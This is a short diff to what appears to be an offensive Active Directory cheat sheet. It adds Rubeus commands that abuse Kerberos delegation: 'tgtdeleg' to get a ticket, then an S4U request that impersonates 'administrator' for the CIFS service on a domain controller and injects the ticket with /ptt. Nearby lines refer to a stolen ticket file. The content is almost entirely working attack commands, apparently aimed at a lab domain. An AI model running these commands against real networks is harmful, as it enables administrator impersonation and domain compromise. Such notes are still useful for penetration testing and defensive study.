@@ -718,6 +718,13 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 ```
 Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}
 ```
+OTHER:-
+```
+Rubeus.exe tgtdeleg
+Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
+klist
+```
+
 
 NOW - we could just do it all in one RUBEUS command:
 
